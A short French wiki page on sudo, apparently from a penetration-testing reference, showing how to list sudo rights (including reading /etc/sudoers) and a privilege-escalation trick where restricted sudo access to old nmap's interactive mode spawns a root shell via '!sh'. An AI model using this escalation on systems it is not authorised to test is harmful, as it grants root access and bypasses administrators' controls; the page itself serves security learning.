---
title: Sudo
permalink: /Sudo/
---

# Sudo

Lister les sudoers
------------------

Il est possible de lister les sudoers avec les commandes suivantes:

``` bash
sudo -l
cat /etc/sudoers
```

sudo limité
-----------

Dans certains cas on peut lancer sudo uniquement sur certaines commandes. Il est parfois possible d'utiliser ces commandes pour obtenir un shell root. Par exemple, si on peut lancer nmap avec sudo:

``` bash
sudo nmap --interactive
Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
whoami
root
```

[Category:Technologies](/Category:Technologies "wikilink")[Category:Linux](/Category:Linux "wikilink")
